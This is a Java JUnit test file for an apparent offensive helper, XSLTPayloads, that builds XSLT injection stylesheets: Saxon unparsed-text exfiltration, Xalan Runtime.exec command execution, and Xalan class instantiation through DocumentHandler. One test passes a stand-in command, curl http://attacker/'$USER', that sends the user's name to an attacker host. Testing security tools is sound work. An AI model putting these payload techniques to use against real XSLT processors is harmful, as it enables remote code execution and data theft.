package helpers;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

public class XSLTPayloadsTest {

    @Test
    void saxonUnparsedTextContainsCallerUrl() {
        String out = XSLTPayloads.stylesheetFor(XSLTPayloads.Flavor.SAXON_UNPARSED_TEXT,
                "https://c.example/x");
        assertTrue(out.contains("unparsed-text"));
        assertTrue(out.contains("https://c.example/x"));
        assertTrue(out.contains("encode-for-uri"));
    }

    @Test
    void xalanRuntimeExecContainsRuntimeAndEscapedCommand() {
        String out = XSLTPayloads.stylesheetFor(XSLTPayloads.Flavor.XALAN_RUNTIME_EXEC,
                "curl http://attacker/'$USER'");
        assertTrue(out.contains("java.lang.Runtime"), "should reference xalan java.lang.Runtime");
        assertTrue(out.contains("rt:getRuntime()"));
        assertTrue(out.contains("rt:exec"));
        // Single quotes must have been escaped so the embedded command is well-formed XML.
        assertFalse(out.contains("'$USER'"), "raw single quotes should be XML-escaped");
        assertTrue(out.contains("&apos;$USER&apos;"));
    }

    @Test
    void xalanClassInstantiationContainsContentHandlerAndEntitiesUrl() {
        String out = XSLTPayloads.stylesheetFor(XSLTPayloads.Flavor.XALAN_CLASS_INSTANTIATION,
                "https://c.example/x.bin");
        assertTrue(out.contains("xalan:content-handler=\"com.sun.beans.decoder.DocumentHandler\""));
        assertTrue(out.contains("xalan:entities=\"https://c.example/x.bin\""));
    }
}
